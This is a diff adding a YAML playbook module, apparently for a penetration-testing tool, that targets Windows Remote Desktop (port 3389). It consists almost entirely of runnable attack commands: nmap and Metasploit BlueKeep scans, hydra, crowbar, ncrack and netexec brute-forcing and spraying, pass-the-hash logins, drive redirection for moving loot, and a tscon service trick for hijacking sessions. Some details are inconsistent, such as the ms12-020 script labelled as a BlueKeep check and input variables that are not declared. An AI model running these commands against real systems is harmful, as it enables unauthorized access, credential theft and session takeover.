@@ -1,0 +1,89 @@
+module: rdp
+name: RDP (3389)
+inputs: [USERS, PASS, DOMAIN, OUT]
+
+sections:
+
+  - id: initial
+    name: Initial Access & Detection
+    steps:
+      - id: version
+        text: Confirm live / version
+        commands: |
+          nmap -p$PORT -sV -sC $IP
+      - id: ntlm_info
+        text: Leak hostname / domain / OS via RDP NTLM
+        commands: |
+          nmap -p$PORT --script=rdp-ntlm-info $IP
+      - id: security
+        text: Enumerate security layer / NLA requirement
+        commands: |
+          nmap -p$PORT --script=rdp-enum-encryption $IP
+          nxc rdp $IP -u '' -p ''
+
+  - id: vuln
+    name: Vulnerability Identification
+    steps:
+      - id: bluekeep
+        text: BlueKeep (CVE-2019-0708) check
+        commands: |
+          nmap -p$PORT --script=rdp-vuln-ms12-020 $IP
+          msfconsole -qx "use auxiliary/scanner/rdp/cve_2019_0708_bluekeep; set RHOSTS $IP; set RPORT $PORT; run; exit"
+      - id: cve_map
+        text: Version to CVE mapping (DejaBlue, MS12-020)
+        commands: |
+          searchsploit rdp
+          searchsploit microsoft remote desktop
+
+  - id: creds
+    name: Default & Weak Credentials
+    authorized: true
+    steps:
+      - id: brute
+        text: Credential brute-force
+        commands: |
+          hydra -L $USERLIST -P $PASSLIST rdp://$IP -s $PORT
+          crowbar -b rdp -s $IP/32 -u $USER -C $PASSLIST
+          ncrack -vv --user $USER -P $PASSLIST rdp://$IP:$PORT
+      - id: spray
+        text: Password spray (netexec, safer for lockout)
+        commands: |
+          nxc rdp $IP -u $USERLIST -p '$PASSLIST' --continue-on-success
+
+  - id: access
+    name: Access & Post-Exploitation
+    steps:
+      - id: connect
+        text: Interactive session with creds
+        commands: |
+          xfreerdp /v:$IP:$PORT /u:$USER /p:'$PASS' /d:$DOMAIN +clipboard /dynamic-resolution
+          rdesktop -u $USER -p '$PASS' $IP:$PORT
+      - id: pth
+        text: Pass-the-hash (Restricted Admin mode)
+        commands: |
+          xfreerdp /v:$IP:$PORT /u:$USER /pth:<NThash> /d:$DOMAIN
+          nxc rdp $IP -u $USER -H <NThash>
+      - id: drive_redirect
+        text: Mount local dir into session (transfer tools/loot)
+        commands: |
+          xfreerdp /v:$IP:$PORT /u:$USER /p:'$PASS' /drive:share,$OUT
+      - id: hijack
+        text: Session hijack note (as SYSTEM, tscon)
+        manual: true
+        commands: |
+          # query user ; sc create sesshijack binpath= "cmd /k tscon <ID> /dest:rdp-tcp#<n>"
+
+  - id: exploit
+    name: Exploitation
+    authorized: true
+    steps:
+      - id: brute
+        text: "Spray / brute"
+        commands: |
+          hydra -L $USERLIST -P $PASSLIST rdp://$IP
+          nxc rdp $IP -u $USER -p $PASS
+      - id: connect
+        text: "Connect / BlueKeep"
+        commands: |
+          xfreerdp /v:$IP /u:$USER /p:$PASS +clipboard /dynamic-resolution
+          # CVE-2019-0708 BlueKeep (unpatched 7 / 2008R2)
